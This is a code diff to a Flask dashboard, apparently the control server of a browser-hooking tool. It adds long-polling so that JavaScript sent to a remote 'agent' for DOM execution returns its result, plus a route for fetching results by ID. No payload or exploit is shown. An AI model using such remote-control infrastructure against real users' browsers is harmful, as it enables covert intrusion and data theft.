@@ -115,6 +115,7 @@ def removeModule(moduleName, agentID):
         return "" 
     return Response("", 404)
 
+# Send command to be executed to Dashboard
 @dashboard.route('/dom/<agentID>', methods=['POST'])
 @auth.login_required
 def sendDomJS(agentID):
@@ -123,7 +124,38 @@ def sendDomJS(agentID):
         dom_command = DomCommand(None, agentID, body['js'], None, 0, datetime.now())
         db.session().add(dom_command)
         db.session().commit()
-        return ""
+
+        longpoll_counter=0
+        while True:
+            time.sleep(0.5)
+            longpoll_counter+=1
+            if(longpoll_counter>8): # wait up to 4 seconds for response
+             return Response("", 404)
+            dom_results = db.session().query(DomCommand).filter(DomCommand.agentId == agentID, DomCommand.processed == 1,DomCommand.id==dom_command.id).order_by(DomCommand.id.desc()).limit(3).all()
+            if len(dom_results) != 0:
+                result={}
+                for cmd_result in dom_results:
+                    result['cmd']=cmd_result.command
+                    result['result']=cmd_result.result
+                return jsonify(result)
+            else:
+                continue
+                    
+    return Response("", 404)
+
+# API to get the results of any command. Not used at the moment
+@dashboard.route('/dom/result/<agentID>/<cmdID>', methods=['GET'])
+@auth.login_required
+def sendDomCmdResult(agentID,cmdID):
+    dom_commands = db.session().query(DomCommand).filter(DomCommand.agentId == agentID, DomCommand.processed == 1,DomCommand.id==cmdID).order_by(DomCommand.id.desc()).limit(3).all()
+    if len(dom_commands) != 0:
+        result={}
+        
+        for dom_command in dom_commands:
+            result['cmd']=dom_command.command
+            result['result']=dom_command.result
+        return jsonify(result)
+
     return Response("", 404)
 
 @dashboard.route('/push/<agentId>', methods=['POST'])
